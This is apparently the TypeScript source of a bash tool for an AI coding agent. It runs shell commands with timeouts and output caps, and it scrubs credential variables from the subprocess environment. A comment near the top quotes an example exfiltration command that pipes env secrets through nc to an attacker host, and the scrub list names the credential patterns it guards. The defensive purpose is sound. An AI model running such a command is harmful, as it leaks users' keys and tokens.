import { isAbsolute, resolve } from 'node:path';
import { ERROR_CODES, type Tool, type ToolResult, toolError } from '../types.ts';

// Strip credentials from the env handed to the subprocess. A model can
// trivially exfiltrate via `bash("env | grep KEY | nc attacker ...")` if
// we don't filter. This is not a substitute for the M2 sandbox — it just
// closes the obvious leak path.
//
// We match by name, case-insensitive. Patterns cover provider keys, AWS
// creds, GitHub tokens, generic *_KEY/*_TOKEN/*_SECRET/*_PASSWORD/*_PASS
// suffixes. False positives (a legit `BUILD_TOKEN`) are acceptable —
// scripts that need them can override via explicit `env` in the cmd.
const SCRUB_PATTERNS: readonly RegExp[] = [
  /_API_KEY$/i,
  /_TOKEN$/i,
  /_SECRET$/i,
  /_PASSWORD$/i,
  /_PASS$/i,
  /^AWS_/i,
  /^OPENAI_/i,
  /^ANTHROPIC_/i,
  /^GOOGLE_API_KEY$/i,
  /^GEMINI_API_KEY$/i,
  /^GITHUB_TOKEN$/i,
  /^GH_TOKEN$/i,
  /^NPM_TOKEN$/i,
  /^DOCKER_PASSWORD$/i,
];

const scrubEnv = (env: NodeJS.ProcessEnv): Record<string, string> => {
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) continue;
    if (SCRUB_PATTERNS.some((p) => p.test(k))) continue;
    out[k] = v;
  }
  return out;
};

export interface BashInput {
  command: string;
  timeout_ms?: number;
  cwd?: string;
  read_only?: boolean;
}

export interface BashOutput {
  stdout: string;
  stderr: string;
  exit_code: number;
  duration_ms: number;
  timed_out: boolean;
  truncated: boolean;
}

const DEFAULT_TIMEOUT_MS = 30_000;
const MAX_OUTPUT_BYTES = 4 * 1024 * 1024; // 4 MB per CONTRACTS §2.6.3
const MAX_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes

// Stream the pipe and stop accumulating once we've kept `cap` bytes.
// We KEEP draining the reader after the cap is hit — if we abandoned
// the stream the kernel pipe buffer would fill and the child would
// block on its next write (effectively a deadlock when paired with
// `proc.exited`). Memory stays bounded at ~cap because past-cap chunks
// are read and discarded, never appended to the chunk list.
//
// UTF-8 is decoded with `{ stream: true }` so a multi-byte sequence
// straddling a chunk boundary doesn't produce a replacement char. The
// final `decoder.decode()` flushes any trailing incomplete bytes.
const readCapped = async (
  stream: ReadableStream<Uint8Array>,
  cap: number,
): Promise<{ text: string; truncated: boolean }> => {
  const reader = stream.getReader();
  const decoder = new TextDecoder('utf-8');
  const chunks: string[] = [];
  let acceptedBytes = 0;
  let omittedBytes = 0;
  let truncated = false;
  try {
    while (true) {
      const { value, done } = await reader.read();
      if (done) break;
      if (truncated) {
        omittedBytes += value.byteLength;
        continue;
      }
      const remaining = cap - acceptedBytes;
      if (value.byteLength <= remaining) {
        chunks.push(decoder.decode(value, { stream: true }));
        acceptedBytes += value.byteLength;
      } else {
        // Last chunk that fits — take the prefix that fits the cap,
        // flush the decoder, mark truncated. Subsequent reads just
        // count omitted bytes.
        if (remaining > 0) {
          chunks.push(decoder.decode(value.subarray(0, remaining), { stream: true }));
          acceptedBytes += remaining;
        }
        chunks.push(decoder.decode());
        omittedBytes += value.byteLength - remaining;
        truncated = true;
      }
    }
    if (!truncated) chunks.push(decoder.decode());
  } finally {
    reader.releaseLock();
  }
  let text = chunks.join('');
  if (truncated) {
    text = `${text}\n[... truncated; ${omittedBytes} bytes omitted]`;
  }
  return { text, truncated };
};

export const bashTool: Tool<BashInput, BashOutput> = {
  name: 'bash',
  description:
    'Run a shell command via bash. Captures stdout/stderr, enforces a timeout, returns the exit code.',
  inputSchema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'Command line to execute via `bash -c`.' },
      timeout_ms: {
        type: 'integer',
        minimum: 100,
        description: 'Kill the command after this many ms. Default 30000.',
      },
      cwd: { type: 'string', description: 'Working directory. Defaults to session cwd.' },
      read_only: {
        type: 'boolean',
        description:
          'Hint that the command is read-only. The permission engine may use this to allow without confirmation.',
      },
    },
    required: ['command'],
  },
  metadata: {
    category: 'bash',
    writes: true, // pessimistic per CONTRACTS §2.6.3
    // Plan mode allows bash ONLY when the model declares the
    // call read-only via `args.read_only === true`. Without this
    // gate, plan mode would either block all bash (losing
    // legitimate inspections like git status / ls / cat / head)
    // or allow all bash including `echo x > file` (silently
    // breaking the "plan mode = no writes" promise). Strict
    // equality to `true` — string "true", truthy values like 1,
    // and missing field all fail closed. The model commits to
    // intent; if it lies, policy + sandbox are the next layer
    // of defense (AGENTIC_CLI §5.1 "bash com efeito").
    planSafe: (args) => (args as { read_only?: unknown }).read_only === true,
    exec: true,
    idempotent: false,
    display: 'raw',
    cost: { latency_ms_typical: 100, max_output_bytes: MAX_OUTPUT_BYTES },
  },
  async execute(args, ctx): Promise<ToolResult<BashOutput>> {
    if (ctx.signal.aborted) {
      return toolError(ERROR_CODES.aborted, 'tool aborted before exec', { retryable: true });
    }

    const timeout = Math.min(args.timeout_ms ?? DEFAULT_TIMEOUT_MS, MAX_TIMEOUT_MS);
    const wd =
      args.cwd === undefined
        ? ctx.cwd
        : isAbsolute(args.cwd)
          ? args.cwd
          : resolve(ctx.cwd, args.cwd);
    const start = Date.now();

    let proc: ReturnType<typeof Bun.spawn>;
    try {
      proc = Bun.spawn(['bash', '-c', args.command], {
        stdout: 'pipe',
        stderr: 'pipe',
        cwd: wd,
        env: scrubEnv(process.env),
        // Bun's spawn signal typing is narrow; cast at the boundary.
        // biome-ignore lint/suspicious/noExplicitAny: Bun spawn signal typing
        ...({ signal: ctx.signal } as any),
      });
    } catch (e) {
      return toolError(
        ERROR_CODES.bashSpawnFailed,
        `failed to spawn bash: ${(e as Error).message}`,
      );
    }

    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      // Both kills can race against the proc exiting on its own; either
      // throws ESRCH on a dead pid. Wrap both so the timeout path never
      // leaks an exception out of the timer callback.
      try {
        proc.kill('SIGTERM');
      } catch {
        /* already exited */
      }
      // Escalate to SIGKILL after a brief grace period.
      setTimeout(() => {
        try {
          proc.kill('SIGKILL');
        } catch {
          /* already exited */
        }
      }, 2000);
    }, timeout);

    let out: { text: string; truncated: boolean } = { text: '', truncated: false };
    let err: { text: string; truncated: boolean } = { text: '', truncated: false };
    let exitCode = -1;
    try {
      const [outRes, errRes, code] = await Promise.all([
        readCapped(proc.stdout as ReadableStream<Uint8Array>, MAX_OUTPUT_BYTES),
        readCapped(proc.stderr as ReadableStream<Uint8Array>, MAX_OUTPUT_BYTES),
        proc.exited,
      ]);
      out = outRes;
      err = errRes;
      exitCode = code;
    } finally {
      clearTimeout(timer);
    }

    const duration_ms = Date.now() - start;

    if (timedOut) {
      return toolError(ERROR_CODES.bashTimeout, `bash command timed out after ${timeout}ms`, {
        details: { duration_ms, command: args.command },
      });
    }

    return {
      stdout: out.text,
      stderr: err.text,
      exit_code: exitCode,
      duration_ms,
      timed_out: false,
      truncated: out.truncated || err.truncated,
    };
  },
};
